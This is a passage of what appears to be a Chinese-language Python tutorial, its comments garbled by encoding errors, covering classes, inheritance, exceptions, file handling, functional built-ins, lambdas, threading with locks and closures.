è®¤éƒ½ç»§æ‰¿è‡ª objectï¼Œå¹¶ä¸”ç»§æ‰¿ä¸‹æ¥äº†ä¸€äº›å†…ç½®çš„æ–¹æ³•\nclass Student(object):\n    # ç±»å†…ç›´æ¥å®šä¹‰äº†ä¸€äº›å˜é‡ï¼Œè¢«ç§°ä¸º[ç±»]å±æ€§ï¼Œæ‰€æœ‰çš„ç±»å±æ€§\n    # å½’ç±»æ‰€æœ‰ï¼Œèƒ½å¤Ÿè¢«ä»»ä½•ä¸€ä¸ªå®ä¾‹è®¿é—®åˆ°ï¼Œç±»ä¼¼äºé™æ€å˜é‡\n    count &#x3D; 0\n    books &#x3D; []\n\n    # æ„é€ è®¿é—®ï¼Œä»»ä½•ä¸€ä¸ªç±»éƒ½æ‹¥æœ‰åç§°ä¸º __init__ çš„æ„é€ æ–¹æ³•ï¼Œ\n    # å½“ä¸€ä¸ªå®ä¾‹è¢«åˆ›å»ºä¹‹åï¼Œä¼šè¢«è‡ªåŠ¨çš„è°ƒç”¨\n    def __init__(self, name, age):\n        # æ‰€æœ‰ä½¿ç”¨ self ä»¥åŠå®ä¾‹ååˆ›å»ºçš„å˜é‡éƒ½æˆä¸ºå®ä¾‹å±æ€§\n        # æ¯ä¸€ä¸ªå®ä¾‹éƒ½æ‹¥æœ‰è‡ªå·±çš„å®ä¾‹å±æ€§ï¼Œå¯ä»¥åŠ¨æ€æ·»åŠ \n        self.name &#x3D; name\n        self.age &#x3D; age\n        print(&#39;è¿™æ˜¯ä¸€ä¸ªæ„é€ æ–¹æ³•&#39;)\n\n    # ä»»ä½•ä¸€ä¸ªç±»éƒ½æ‹¥æœ‰åç§°ä¸º __del__ çš„ææ„æ–¹æ³•\n    def __del__(self):\n        print(&#39;è¿™æ˜¯ä¸€ä¸ªææ„æ–¹æ³•&#39;)\n\n\n# å¦‚æœå­˜åœ¨æ„é€ æ–¹æ³•ï¼Œé‚£ä¹ˆåˆ›å»ºå®ä¾‹çš„æ—¶å€™ï¼Œå¿…é¡»æä¾›é™¤\n# self ä»¥å¤–çš„å…¶å®ƒæ‰€æœ‰å‚æ•°ï¼Œself ç±»ä¼¼äº thisï¼Œè¡¨ç¤º\n# è°ƒç”¨æ–¹æ³•çš„æ˜¯å“ªä¸€ä¸ªå®ä¾‹\nobjStudent1 &#x3D; Student(&quot;xiaoming&quot;, 19)\n\nç±»å±æ€§çš„ä½¿ç”¨Python\n# å®šä¹‰ä¸€ä¸ªç±»ï¼Œç±»å†…æ·»åŠ äº†ç±»å±æ€§\nclass Demo(object):\n    # ä¸€ä¸ªç±»å±æ€§\n    class_value &#x3D; 0\n\n\ndemo &#x3D; Demo()\n# æƒ³è¦è®¿é—®ç±»å±æ€§ï¼Œå¯ä»¥ä½¿ç”¨ç±»åä»¥åŠå®ä¾‹å(ä¸æ¨è)\nprint(demo.class_value)\nprint(Demo.class_value)\n\n# å¯¹äºç±»å±æ€§çš„ä¿®æ”¹ï¼Œ\ndemo.class_value &#x3D; 100          # åˆ›å»ºäº†ä¸€ä¸ªåŒåçš„å®ä¾‹å±æ€§\nprint(Demo.class_value)\nDemo.class_value &#x3D; 200          # ä¿®æ”¹ç±»å±æ€§åªèƒ½ä½¿ç”¨ç±»å\nprint(Demo.class_value)\n\n# åŠ¨æ€å¢å‡ç±»å±æ€§çš„æ–¹å¼\n#   å¢åŠ : é€šè¿‡ç±»åæˆ–ç±»æ–¹æ³•ä¸­çš„ cls å…³é”®å­—å¯ä»¥åŠ¨æ€æ·»åŠ \nDemo.class_value2 &#x3D; 1000\nprint(Demo.__dict__)        # åŒ…å«ç±»å†…æ‰€æœ‰çš„å±æ€§ç»„åˆçš„é”®å€¼å¯¹\n#   åˆ é™¤: é€šè¿‡å…³é”®å­— del è¿›è¡Œåˆ é™¤\ndel Demo.class_value\nprint(Demo.__dict__)\n\nå®ä¾‹å±æ€§çš„ä½¿ç”¨Python\n# ä¸€ä¸ªç±»ï¼ŒåŒ…å«äº†å®ä¾‹å±æ€§çš„ä½¿ç”¨\nclass Demo(object):\n\n    # å¦‚æœåœ¨æ„é€ æ–¹æ³•å†…æ·»åŠ å®ä¾‹å±æ€§ï¼Œå¯ä»¥ä¿è¯æ¯ä¸€ä¸ªå®ä¾‹éƒ½æ‹¥æœ‰\n    def __init__(self, value):\n        self.value &#x3D; value\n\n    # ä¸€ä¸ªå®ä¾‹æ–¹æ³•ï¼Œå…¶ä¸­ä½¿ç”¨äº† self å…³é”®å­—æ·»åŠ å®ä¾‹å±æ€§\n    def add_value(self):\n        self.value1 &#x3D; 0\n\n\n# åˆ›å»ºä¸€ä¸ªå®ä¾‹(æ¯ä¸ªå®ä¾‹éƒ½æœ‰è‡ªå·±çš„å±æ€§)\ndemo1 &#x3D; Demo(1000)\ndemo2 &#x3D; Demo(2000)\n\n# è¾“å‡ºä¸¤ä¸ªå®ä¾‹ä¸­çš„æ‰€æœ‰å…ƒç´ \nprint(demo1.__dict__)\nprint(demo2.__dict__)\n\n# é€šè¿‡ self ä»¥åŠå®ä¾‹ååŠ¨æ€çš„æ·»åŠ å±æ€§\ndemo1.add_value()\ndemo2.value2 &#x3D; 1000\nprint(demo1.__dict__)\nprint(demo2.__dict__)\nPython\n# å®šä¹‰ä¸€ä¸ªç©ºç±»ï¼Œç”¨äºæµ‹è¯•å†…éƒ¨å±æ€§\nclass Demo(object):\n    pass\n\n# å¦‚æœæƒ³çœ‹åˆ°ä¸€ä¸ªç±»æä¾›äº†å“ªäº›å±æ€§ï¼Œå°±ä½¿ç”¨ dir\nprint(dir(Demo))\n\n# å¯ä»¥ä½¿ç”¨ help æŸ¥æ‰¾æŸä¸€ä¸ªç±»çš„å¸®åŠ©ä¿¡æ¯\nprint(help(list))\n\n# å¯ä»¥é€šè¿‡å†…ç½®çš„ä¸€äº›å±æ€§ï¼Œè¾“å‡ºæƒ³è¦çš„å†…å®¹\nprint(Demo.__dict__)å†…ç½®å±æ€§çš„æŸ¥çœ‹\n\næˆå‘˜æ–¹æ³•Python\n# åœ¨ç±»å†…æµ‹è¯•pythonæä¾›çš„ä¸‰ç§æˆå‘˜æ–¹æ³•\nclass Demo(object):\n\n    # å®ä¾‹æ–¹æ³•: ç¬¬ä¸€ä¸ªå‚æ•°è¡¨ç¤ºçš„æ˜¯è°ƒç”¨å½“å‰æ–¹æ³•çš„å®ä¾‹ï¼Œç±»ä¼¼ thisï¼Œé€šå¸¸åç§°ä¸º\n    #   selfï¼Œä¹Ÿå¯ä»¥æ¢åšå…¶å®ƒåç§°(ä¸æ¨è)ï¼Œé€šè¿‡ self å¯ä»¥åŠ¨æ€æ“ä½œå®ä¾‹å±æ€§\n    def member_function(self):\n        print(&#39;member_function&#39;)\n\n    # ç±»æ–¹æ³•: ç¬¬ä¸€ä¸ªå‚æ•°è¡¨ç¤ºå½“å‰æ–¹æ³•æ‰€åœ¨çš„ç±»ï¼Œç±»ä¼¼ç±»åï¼Œé€šå¸¸åç§°ä¸º clsï¼Œç±»\n    #   æ–¹æ³•å¸¸ç”¨äºéœ€è¦è®¿é—®ç±»å±æ€§ä½†æ˜¯ä¸è®¿é—®å®ä¾‹å±æ€§çš„æƒ…å†µ\n    @classmethod\n    def class_function(cls):\n        print(&#39;class_function&#39;)\n\n    # é™æ€æ–¹æ³•: å¯¹æ–¹æ³•åæ²¡æœ‰ä»»ä½•çš„è¦æ±‚ï¼Œå¦‚æœæ–¹æ³•æ²¡æœ‰è®¿é—®ä»»ä½•çš„å±æ€§ï¼Œå°±å¯ä»¥è®¾ä¸ºé™æ€çš„\n    @staticmethod\n    def static_method():\n        print(&#39;static_method&#39;)\n\nå±æ€§é™åˆ¶Python\nclass Demo(object):\n    # ä»…åŒä¸‹åˆ’çº¿å¼€å¤´è¡¨ç¤ºè¿™æ˜¯ç§æœ‰çš„\n    __private_value &#x3D; 1000\n\n    # __slots__ å¯ä»¥é™å®šæˆ‘ä»¬èƒ½å¤Ÿåˆ›å»ºä»€ä¹ˆæ ·çš„å±æ€§\n    __slots__ &#x3D; (&#39;value1&#39;, &#39;value2&#39;)\n\n    # é€šå¸¸åŒä¸‹åˆ’çº¿å¼€å¤´è¡¨ç¤ºç§æœ‰ï¼ŒåŒä¸‹åˆ’çº¿å¼€å¤´ç»“å°¾è¡¨ç¤ºè§£é‡Šå™¨æä¾›\n    # å•ä¸‹åˆ’çº¿å¼€å¤´çº¦å®šä¿—ç§°æ˜¯ç§æœ‰çš„ï¼Œä½†å®é™…æ²¡æœ‰ä»»ä½•æ§åˆ¶\n\n# é€šè¿‡ __dict__ å±æ€§æŸ¥çœ‹å½“å‰ç±»å†…çš„æ‰€æœ‰ç±»å±æ€§\nprint(Demo.__dict__)\n\n# python ä¸­çš„ç§æœ‰å®é™…åªæ˜¯ä»¥ä¸€å®šçš„æ–¹å¼ä¸ºå±æ€§ä¿®æ”¹äº†åç§°: _ç±»å+å±æ€§å\nprint(Demo._Demo__private_value)\n\n# åˆ›å»ºå®ä¾‹å¹¶ä½¿ç”¨å®ä¾‹åŠ¨æ€æ·»åŠ å±æ€§\ndemo &#x3D; Demo()\ndemo.value1 &#x3D; 1000\ndemo.value2 &#x3D; 1000\ndemo.value3 &#x3D; 1000\n\n\nclass Demo2(object):\n    def __init__(self, name: int, age: int):\n        self._name &#x3D; name\n        self._age &#x3D; age\n\n# ç±»é­”æœ¯æ–¹æ³•çš„é‡å®šä¹‰: __add__ __truediv__ __init__ __str__\n\nç±»çš„ç»§æ‰¿Python\n# åˆ›å»ºä¸€ä¸ªçˆ¶ç±»ï¼Œæä¾›äº†è‡ªå·±çš„å±æ€§å’Œæ–¹æ³•\nclass Parent(object):\n    # çˆ¶ç±»æä¾›çš„ç±»å±æ€§\n    parent_value &#x3D; 1000\n\n    # æ„é€ æ–¹æ³•ï¼Œçˆ¶ç±»çš„æ„é€ æ–¹æ³•\n    def __init__(self, name):\n        print(f&#39;Parent.__init__(&#123;name&#125;)&#39;)\n\n\nclass Parent2(object):\n    parent_value &#x3D; 2000\n\n    def __init__(self):\n        print(f&#39;Parent2.__init__()&#39;)\n\n\n# åˆ›å»ºä¸€ä¸ªå­ç±»ï¼Œç»§æ‰¿è‡ª Parent\nclass Child(Parent, Parent2):\n\n    # å¦‚æœå­ç±»æ²¡æœ‰æä¾›æ„é€ æ–¹æ³•ï¼Œå°±ä¼šä½¿ç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•\n    def __init__(self):\n        print(&#39;Child.__init__()&#39;)\n        # ä¸ä¼šè‡ªåŠ¨è°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•\n        Parent.__init__(self, &#39;xiaoming&#39;)\n        # ä½¿ç”¨ super è°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•\n        super().__init__(&#39;xiaoming&#39;)\n\n        # å¦‚æœå¯¹ super è¿›è¡Œä¼ å‚ï¼Œé‚£ä¹ˆå®é™…è°ƒç”¨çš„å°†æ˜¯å‚æ•°\n        # ä¸€åœ¨ mro(ç»§æ‰¿) é“¾ä¸­çš„ä¸‹ä¸€ä¸ªç±»çš„æ–¹æ³•\n        Parent2.__init__(self)\n        super(Parent, self).__init__()\n        super(Child, self).__init__(&#39;xiaoming&#39;)\n\n\n    # åœ¨å­ç±»ä¸­è®¿é—®çˆ¶ç±»æ˜¯å±æ€§\n    def visit_value(self):\n        # ç›´æ¥ä»¥ç±»åè¿›è¡Œè®¿é—®ï¼Œè®¿é—®çˆ¶ç±»çš„å±æ€§\n        print(Parent.parent_value)\n\nchild &#x3D; Child()\nchild.visit_value()\nprint(Child.__mro__)\n\n\n#                          object(1)\n#               parent1(3)         parent2(2)\n#                child(parent1, parent2)(4)\n\n\n# python ä¸­ç»§æ‰¿çš„æ ¸å¿ƒå°±æ˜¯ mro\n\nå¼‚å¸¸å¤„ç†Python\ntry:\n    # åŒ…å«çš„æ˜¯å¯èƒ½äº§ç”Ÿå¼‚å¸¸çš„è¯­å¥\n    print(10 &#x2F; 1)\nexcept ZeroDivisionError:\n    # å¦‚æœäº§ç”Ÿäº†å¼‚å¸¸ï¼Œå°±è·³è½¬åˆ°è¿™ä¸ªä½ç½®æ‰§è¡Œ\n    print(&#39;äº§ç”Ÿäº†å¼‚å¸¸&#39;)\nelse:\n    # æ­£å¸¸æƒ…å†µä¸‹ï¼Œæ‰€æ‰§è¡Œçš„ä»£ç \n    print(&#39;æ²¡æœ‰äº§ç”Ÿå¼‚å¸¸&#39;)\n\n\n# å¦‚æœæ¥æ”¶çš„å¼‚å¸¸ç±»å‹å’Œå®é™…äº§ç”Ÿçš„ä¸ä¸€è‡´ï¼Œå°±æ¥æ”¶ä¸äº†å¼‚å¸¸\ntry:\n    print(10 &#x2F; 0)\nexcept ZeroDivisionError: #NameError:\n    print(&#39;äº§ç”Ÿäº†åç§°å¼‚å¸¸&#39;)\n\n\n# åœ¨ python ä¸­ï¼Œäº§ç”Ÿä»»ä½•ä¸€ä¸ªå¼‚å¸¸éƒ½ä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸å¯¹è±¡ï¼Œ\n# é€šè¿‡ except type as name çš„æ–¹å¼å¯ä»¥æ¥æ”¶åˆ°å¼‚å¸¸å¯¹è±¡\ntry:\n    l &#x3D; []\n    print(l[0])\n    # æ¥æ”¶åˆ°äº† IndexError å¼‚å¸¸å¯¹è±¡å¹¶å–åä¸º e\nexcept IndexError as e:\n    print(e)\n\n\n# é€šå¸¸ä¸ºäº†èŠ‚çœæ—¶é—´å’Œç²¾åŠ›ä¼šç›´æ¥ä½¿ç”¨ç²¾ç®€å†™æ³•\ntry:\n    pass\n# Exception æ˜¯é€šç”¨å¼‚å¸¸(è¯­æ³•\\ç½‘ç»œ\\æ–‡ä»¶)çš„åŸºç±»ï¼Œé€šè¿‡è¿™ä¸ªç±»å‹\n# å°±å¯ä»¥æ¥æ”¶åˆ°å¤§å¤šæ•°çš„å¼‚å¸¸äº†\nexcept Exception as e:\n    pass\n\n\nimport sys\n\n\n# é€šè¿‡ finally å¯ä»¥ä¿è¯ç¨‹åºæ— è®ºä»¥ä½•ç§æ–¹å¼æ­£å¸¸é€€å‡ºï¼Œå…¶ä¸­çš„ä»£ç éƒ½è¢«æ‰§è¡Œ\n#   ä¾‹å¦‚è¿™äº›è¯­å¥: return continue break sys.exit(0)\ntry:\n    if True:\n        # sys.exit(0)\n        pass\nfinally:\n    # ç”¨äºæ‰§è¡Œæ¸…ç†æ“ä½œ\n    print(&#39;finally&#39;)\n\n\n# ä¸»åŠ¨æŠ›å‡ºå¼‚å¸¸ï¼Œå¦‚æœæƒ³è¦è‡ªå®šä¹‰å¼‚å¸¸ï¼Œå¯ä»¥å®ç°ä¸€ä¸ªè‡ªå·±çš„ç»§æ‰¿è‡ª BaseException çš„å¼‚å¸¸ç±»\n# ç„¶åé€šè¿‡ raise ä¸»åŠ¨çš„æŠ›å‡ºè¿™ä¸ªç±»å‹ï¼Œå¹¶è¿›è¡Œå¤„ç†\npassword &#x3D; input(&#39;password: &#39;)\nif len(password) &lt; 8:\n    raise Exception(&#39;å¯†ç é•¿åº¦è¿‡çŸ­&#39;)\n\næ–‡ä»¶æ“ä½œPython\n# ä½¿ç”¨ Python å†…ç½®å‡½æ•°å®Œæˆæ–‡ä»¶æ“ä½œ\n\n# å‚æ•°ä¸€æ˜¯æ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„ï¼Œå‚æ•°äºŒæ˜¯æ‰“å¼€æ–¹å¼ï¼Œå¯èƒ½éœ€è¦æ³¨æ„ encoding\nfile &#x3D; open(&#39;content.txt&#39;, &#39;w+&#39;)\n\n# å‘æ–‡ä»¶çš„å†…éƒ¨å†™å…¥æ•°æ®\nfile.write(&#39;hello 15pb&#39;)\nfile.writelines([&#39;ç¬¬ä¸€è¡Œ\\n&#39;, &#39;ç¬¬äºŒè¡Œ\\n&#39;, &#39;ç¬¬ä¸‰è¡Œ\\n&#39;])\n\n# å…³é—­æ–‡ä»¶ï¼Œå°†å¯¹æ–‡ä»¶çš„ä¿®æ”¹ä¿å­˜åˆ°ç¡¬ç›˜\nfile.close()\n\n# é€šè¿‡ with open() as name çš„å½¢å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶\nwith open(&#39;content.txt&#39;, &#39;r&#39;) as file:\n    # å°† open å‡½æ•°çš„è¿”å›å€¼ä¿å­˜åˆ°å˜é‡ file ä¸­\n    # å¯¹äºæ–‡ä»¶å¯¹è±¡ï¼Œåœ¨ç¦»å¼€ with ä½œç”¨åŸŸçš„æ—¶å€™\n    # ä¼šè‡ªåŠ¨çš„è¿›è¡Œå…³é—­ï¼Œåªéœ€è¦å…³æ³¨é€»è¾‘éƒ¨åˆ†\n    print(file.read())          # é»˜è®¤è¯»å–æ‰€æœ‰å†…å®¹\n    print(file.readline())      # ä¸€è¡Œæœ€å¤§å­—ç¬¦ä¸ªæ•°\n    print(file.readlines())     # è¯»å–çš„æœ€å¤šè¡Œæ•°\n\n# ä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶çš„æ—¶å€™ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨å°±ä¼šäº§ç”Ÿå¼‚å¸¸\ntry:\n    with open(&#39;content2.txt&#39;) as file:\n        pass\nexcept Exception as e:\n    print(e)\n\n# æ›´å¤šçš„å‡½æ•°: file.seek + file.tell -&gt; è®¡ç®—æ–‡ä»¶å¤§å°\n\n# æ–‡ä»¶æ“ä½œæ¨¡å—: osï¼Œos çš„ä½¿ç”¨æ–¹å¼å’Œ C è¯­è¨€çš„å‡½æ•°å®Œå…¨ä¸€è‡´\n\nå†…ç½®å‡½æ•°å’Œæ¨¡å—çš„ä½¿ç”¨structPython\n# é€šè¿‡ struct å¯ä»¥å®ç°å­—èŠ‚æµåˆ°ç»“æ„ä½“çš„è½¬æ¢\nimport struct\n\n# æ‰“åŒ…æˆ int + int + char[1024] çš„ç»“æ„ä½“\nbytes_content &#x3D; struct.pack(&#39;ii1024s&#39;, 10, 20, b&#39;hello15pb&#39;)\nprint(bytes_content)\n\n# å°† nt + int + char[1024] çš„ç»“æ„ä½“è¿›è¡Œè§£åŒ…\ntype, length, content &#x3D; struct.unpack(&#39;ii1024s&#39;, bytes_content)\nprint(type, length, content.decode(&#39;utf8&#39;).strip(&#39;\\0&#39;))\n\nfilterPython\n# filer: å°†å‚æ•°äºŒæŒ‡å®šçš„åºåˆ—ä¸­ï¼Œæ¯ä¸€ä¸ªå…ƒç´ éƒ½ä¼ å…¥åˆ°å‚æ•°ä¸€æŒ‡å®šçš„å‡½æ•°ä¸­\n#   å¦‚æœè¯¥å‡½æ•°è¿”å›ä¸º trueï¼Œå°±å°†å…ƒç´ ä¿å­˜åˆ°ä¸€ä¸ªæ–°çš„åºåˆ—ä¸­ï¼Œå¦åˆ™ä¸¢å¼ƒ\n\n# è¯¥å‡½æ•°æœ€å°‘éœ€è¦æœ‰ä¸€ä¸ªå‚æ•°ï¼Œç”¨äºæ¥æ”¶åºåˆ—ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ \ndef filer_function(letter):\n    # å¦‚æœæ˜¯å¤§å†™çš„ï¼Œå°±ä¿ç•™ï¼Œå¦åˆ™ä¸¢å¼ƒ\n    return letter.isupper()\n\n\ndef filer_function2(value):\n    return True if value % 3 &#x3D;&#x3D; 0 else False\n\n\nprint(list(filter(filer_function, &#39;AaBbCcDdEeFfGg&#39;)))\nprint(list(filter(filer_function2, range(1000))))\n\nreducePython\nimport functools\n\n# reduce: ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¸€å®šè¦æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œåœ¨ä½¿ç”¨\n#   reduce æ—¶ï¼Œç¬¬ä¸€æ¬¡ä¼šå°†å¯è¿­ä»£å¯¹è±¡çº¢çš„å…ƒç´ ä¸€å’Œå…ƒç´ äºŒä¼ å…¥åˆ°å‡½æ•°ä¸­ï¼Œ\n#   è®¡ç®—å‡ºä¸€ä¸ªè¿”å›å€¼ï¼Œæ¥ä¸‹æ¥æ¯æ¬¡éƒ½å°†å‡½æ•°çš„è¿”å›ç»“æœå’Œä¸‹ä¸€ä¸ªå…ƒç´ è¿›è¡Œ\n#   è®¡ç®—ï¼ŒçŸ¥é“åºåˆ—éå†ç»“æŸ\n\n\ndef add_value(left, right):\n    return left + right\n\ndef mul_value(left, right):\n    return left * right\n\n\n# é¦–å…ˆå°† 1 å’Œ 2 æ”¾å…¥å‡½æ•°ï¼Œè¿”å› 3ï¼Œå†å°† 3 å’Œ 3 è®¡ç®—è¿”å› 6ï¼Œå†å°† 6 å’Œ 4\n# è®¡ç®—è¿”å› 10ï¼Œæœ€ç»ˆä¸€ç›´åŠ åˆ° 10ï¼Œè¿”å›çš„æ˜¯ 10 åˆ° 1 ç›¸åŠ çš„å’Œ\nprint(functools.reduce(add_value, range(1, 11)))\nprint(functools.reduce(mul_value, range(1, 11)))\n\nmapPython\n# map: å¯ä»¥ä¼ å…¥å¤šä¸ªåºåˆ—ï¼Œå‚æ•°ä¸€è¦æ±‚ä¼ å…¥ä¸€ä¸ªå‡½æ•°ï¼Œå‡½æ•°æ¥æ”¶çš„å‚æ•°\n#   ä¸ªæ•°å¿…é¡»å’Œä¼ å…¥çš„åºåˆ—ä¸ªæ•°ç›¸åŒï¼Œåœ¨ä½¿ç”¨ map çš„æ—¶å€™ï¼Œä¼šåˆ†åˆ«å°†æ¯\n#   ä¸€ä¸ªåºåˆ—ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ ä¼ å…¥å‡½æ•°ï¼Œå¹¶ä¸”å°†å‡½æ•°çš„è¿”å›å€¼ç»„åˆæˆæ–°\n#   çš„åºåˆ—\n\ndef function(left, right):\n    return left* right\n\nprint(list(map(function, &#39;abcdefg&#39;, [1, 2, 3, 4, 5, 6, 7])))\n\nlambdaPython\n# lambda è¡¨è¾¾å¼çš„è¯­æ³•ï¼Œè¡¨è¾¾å¼çš„ç»“æœæ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°\nfunc &#x3D; lambda letter, count: letter * count\n\n# 1. å‚æ•°ä½¿ç”¨é€—å·éš”å¼€\n# 2. å‡½æ•°ä½“ä½¿ç”¨å†’å·éš”å¼€\n# 3. å‡½æ•°ä½“åªèƒ½æœ‰ä¸€æ¡è¯­å¥\n# 4. å‡½æ•°ä½“å†…çš„ä¸€æ¡è¯­å¥ä¼šè¢«ä½œä¸ºè¿”å›å€¼\nprint(func(&#39;a&#39;, 10))\n\n\nimport functools\n\n\n# ä½¿ç”¨åŒ¿åå‡½æ•°å¯ä»¥åœ¨æŸäº›ç¨‹åº¦ä¸Šï¼Œå‡å°‘ä»£ç é‡\nprint(list(filter(lambda letter: letter.isupper(), &quot;AaBbCcDdEeFfGg&quot;)))\nprint(functools.reduce(lambda left, right: left * right, range(1, 11)))\nprint(functools.reduce(lambda left, right: left + right, range(1, 11)))\nprint(list(map(lambda letter, count: letter * count, &quot;abcdefg&quot;, [1, 2, 3, 4, 5, 6, 7])))\n\nçº¿ç¨‹Python\n# ä½¿ç”¨ threading å¯ä»¥å®ç°çº¿ç¨‹æ“ä½œ(ä¼ªçº¿ç¨‹)\nimport threading\nimport time\n\n\n# ä¸å¸¦å‚æ•°çš„çº¿ç¨‹å›è°ƒå‡½æ•°\ndef worker_thread():\n    for i in range(1000):\n        # current_thread è¡¨ç¤ºçš„å§‹ç»ˆéƒ½æ˜¯å½“å‰çš„çº¿ç¨‹\n        print(threading.current_thread().name, i)\n        time.sleep(0.1)\n\n\n# æ¨¡æ‹Ÿä¸»å‡½æ•°çš„ä½¿ç”¨\ndef main():\n    # é€šè¿‡ Thread å‡½æ•°åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œéœ€è¦æŒ‡å®šèµ·å§‹ä½ç½®(å‡½æ•°)\n    t &#x3D; threading.Thread(target&#x3D;worker_thread, name&#x3D;&#39;worker_thread&#39;)\n    # Thread åˆ›å»ºçš„å®é™…æ˜¯çº¿ç¨‹å¯¹è±¡ï¼Œé»˜è®¤å¹¶æ²¡æœ‰è¿è¡Œï¼Œéœ€è¦è°ƒç”¨ start å‡½æ•°\n    t.start()\n\n    for i in range(1000):\n        # current_thread è¡¨ç¤ºçš„å§‹ç»ˆéƒ½æ˜¯å½“å‰çš„çº¿ç¨‹\n        print(threading.current_thread().name, i)\n        time.sleep(0.1)\n\n    # é€šå¸¸ï¼Œä¸ºäº†ç¡®ä¿ä¸»çº¿ç¨‹é€€å‡ºä¹‹å‰ï¼Œæ‰€æœ‰å…¶å®ƒçº¿ç¨‹æ‰§è¡Œå®Œæ¯•ï¼Œéœ€è¦ç­‰å¾…\n    t.join()\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    main()\n\nå‚æ•°ä¼ é€’Python\nimport threading\n\n\n# çº¿ç¨‹å›è°ƒå‡½æ•°ï¼Œå¸¦å‚\ndef thread1(arg1, arg2, arg3):\n    print(arg1, type(arg1))\n    print(arg2, type(arg2))\n    print(arg3, type(arg3))\n\n\n# çº¿ç¨‹å›è°ƒå‡½æ•°ï¼Œå¸¦å…ƒç»„å˜å‚\ndef thread2(*args):\n    print(args, type(args))\n\n\n# çº¿ç¨‹å›è°ƒå‡½æ•°ï¼Œå¸¦å­—å…¸å˜å‚\ndef thread3(**kwargs):\n    print(kwargs, type(kwargs))\n\n\n# çº¿ç¨‹å›è°ƒå‡½æ•°ï¼Œå¸¦å…ƒç»„å’Œå­—å…¸å˜å‚\ndef thread4(*args, **kwargs):\n    print(args, type(args))\n    print(kwargs, type(kwargs))\n\n\n# åˆ›å»ºå¤šä¸ªçº¿ç¨‹ï¼Œä¼ é€’ç›¸åº”çš„å‚æ•°\nthreading.Thread(target&#x3D;thread2, args&#x3D;(1, 2, 3)).start()\nthreading.Thread(target&#x3D;thread3, kwargs&#x3D;&#123;&quot;a&quot;: 1, &quot;b&quot;: 2, &quot;c&quot;: 3&#125;).start()\nthreading.Thread(target&#x3D;thread4, args&#x3D;(1, 2, 3), kwargs&#x3D;&#123;&quot;a&quot;: 1, &quot;b&quot;: 2, &quot;c&quot;: 3&#125;).start()\nthreading.Thread(target&#x3D;thread1, args&#x3D;(1, 2, 3)).start()\n\nçº¿ç¨‹çš„é”Python\n# ä½¿ç”¨ threading å¯ä»¥å®ç°çº¿ç¨‹æ“ä½œ(ä¼ªçº¿ç¨‹)\nimport threading\nimport time\n\n\n# å®šä¹‰ä¸€ä¸ªå…¨å±€çš„é”\nlock &#x3D; threading.Lock()\n\n\n# ä¸å¸¦å‚æ•°çš„çº¿ç¨‹å›è°ƒå‡½æ•°\ndef worker_thread():\n    for i in range(1000):\n        lock.acquire()\n        # current_thread è¡¨ç¤ºçš„å§‹ç»ˆéƒ½æ˜¯å½“å‰çš„çº¿ç¨‹\n        print(threading.current_thread().name, i)\n        time.sleep(0.1)\n        lock.release()\n\n\n# æ¨¡æ‹Ÿä¸»å‡½æ•°çš„ä½¿ç”¨\ndef main():\n    # é€šè¿‡ Thread å‡½æ•°åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œéœ€è¦æŒ‡å®šèµ·å§‹ä½ç½®(å‡½æ•°)\n    t &#x3D; threading.Thread(target&#x3D;worker_thread, name&#x3D;&#39;worker_thread&#39;)\n    # Thread åˆ›å»ºçš„å®é™…æ˜¯çº¿ç¨‹å¯¹è±¡ï¼Œé»˜è®¤å¹¶æ²¡æœ‰è¿è¡Œï¼Œéœ€è¦è°ƒç”¨ start å‡½æ•°\n    t.start()\n\n    for i in range(1000):\n        lock.acquire()\n        # current_thread è¡¨ç¤ºçš„å§‹ç»ˆéƒ½æ˜¯å½“å‰çš„çº¿ç¨‹\n        print(threading.current_thread().name, i)\n        time.sleep(0.1)\n        lock.release()\n\n    # é€šå¸¸ï¼Œä¸ºäº†ç¡®ä¿ä¸»çº¿ç¨‹é€€å‡ºä¹‹å‰ï¼Œæ‰€æœ‰å…¶å®ƒçº¿ç¨‹æ‰§è¡Œå®Œæ¯•ï¼Œéœ€è¦ç­‰å¾…\n    t.join()\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    main()\n\nmapä¸lambdaç»“åˆå®ç°æ¨è¾‰ä¸‰è§’Python\ndef generate(numRows):\n        if numRows&#x3D;&#x3D;0:\n            return []\n        l1 &#x3D; [[1]]\n        n &#x3D; 1\n        while n&lt;numRows:\n            l1.append(map(lambda x,y:x+y, [0]+l1[-1], l1[-1]+[0]))\n            n +&#x3D; 1\n        return l1\n\nè£…é¥°å™¨Python\n# python ä¸­é«˜é˜¶å‡½æ•°çš„å®šä¹‰: å‚æ•°æˆ–è¿”å›å€¼ä¸ºå‡½æ•°çš„å‡½æ•°å°±æ˜¯é«˜é˜¶å‡½æ•°\n\n# é—­åŒ…: å†…éƒ¨å‡½æ•°ä½¿ç”¨äº†å¤–éƒ¨å‡½æ•°çš„å±€éƒ¨å˜é‡\ndef outer(left):\n    def inner(right):\n        return left * right\n    return inner\n\n\n# å°†åšæ“ä½œæ•°ä¼ å…¥ç»™å‡½æ•°ï¼Œå®é™…ä¸Šè¿”å›çš„æ˜¯ä¸‹åˆ—å‡½æ•°\n&quot;&quot;&quot;\n    def inner(right):\n        return 10 * right \n&quot;&quot;&quot;\ninner &#x3D; outer(10)\n\n# å¯ä»¥è°ƒç”¨è¿”å›çš„å‡½æ•°ï¼Œä¼ å…¥å³æ“ä½œæ•°å¹¶å¾—åˆ°ç»“æœ\nprint(inner(20))\n\n\n# è£…é¥°å™¨: 